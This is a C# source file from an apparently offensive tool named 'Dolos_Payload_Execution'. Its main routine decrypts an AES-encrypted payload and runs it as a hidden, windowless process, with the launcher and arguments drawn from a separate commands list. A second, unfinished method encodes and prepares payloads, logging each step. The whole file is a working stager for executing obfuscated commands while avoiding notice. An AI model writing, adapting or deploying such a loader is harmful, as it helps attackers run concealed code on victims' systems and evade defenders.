using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Dolos_Payload_Execution
{
    class Program
    {
        public static String Payload = Dolos_Payload_Execution.Payload.EncyptedPayload;
        static void Main(string[] args)
        {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.FileName = Commands.commands[0];
            psi.Arguments = Commands.commands[1] + " " + Decrypt(Payload);
            System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi); ;
        }

            public static string Decrypt(string cipherText)
            {
                byte[] IV = Convert.FromBase64String(cipherText.Substring(0, 20));
                cipherText = cipherText.Substring(20).Replace(" ", "+");
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey.EncryptedKey, IV);
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
        public void convertasdasd(String Payload)
        {
            String cleanPayload = "";
            bool Dirty;
            byte[] plaintext;
            String base64 = "";
            String encrypted = "";
            bool fatal = false;
            log("[i] Begining conversion of payload");

                log("[i] Removing formating");
                try
                {
                    cleanPayload = Regex.Replace(Payload, @"\s+", "");
                    Dirty = false;
                }
                catch
                {
                    Dirty = true;
                    log("[!] Error in removing whitespace!");
                }
       

            if (!Dirty)
            {
                log("[i] Formatting Removed Successfully");
                plaintext = System.Text.Encoding.Unicode.GetBytes(cleanPayload);
            }
            else
            {
                log("[i] Formatting Not Removed Successfully");
                plaintext = System.Text.Encoding.Unicode.GetBytes(Payload);
            }
            log("[i] Converting to B64");
            try
            {
                base64 = System.Convert.ToBase64String(plaintext);
            }
            catch (Exception e)
            {
                log("[!] FATAL: Failed to convert to Base64 Trace Fallows\n" + e);
                fatal = true;
            }
            log("[i] Converted to B64");
            log("[i] Encrypting");
            if (!fatal)
            {
                log($"[!] Random String Generated");
                log($"[!] Building Encryption Key");
                log($"[!] Encrypting");
                try
                {
                    log("[i] Encrypted!");
                }
                catch
                {
                    encrypted = "ERROR";
                    log("[!] Error In Encryption");
                }
            }
            else
            {
                log("[!] Fatal Error Occured! Stopping!");
            }
        }

        private void log(string v)
        {
            throw new NotImplementedException();
        }
    }
}